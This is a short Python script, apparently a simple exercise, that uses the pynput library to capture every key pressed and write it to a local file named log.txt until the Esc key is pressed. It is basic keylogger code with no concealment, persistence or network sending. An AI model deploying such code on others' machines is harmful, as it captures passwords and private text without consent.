import logging
from pynput import keyboard


def on_press(key):
    counter=0
    log=logging.basicConfig(filename="log.txt",level=logging.INFO,format="%(message)s")     
    logging.info(key)
    

def on_release(key):

    if(key==keyboard.Key.esc):
        return False


with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()

input()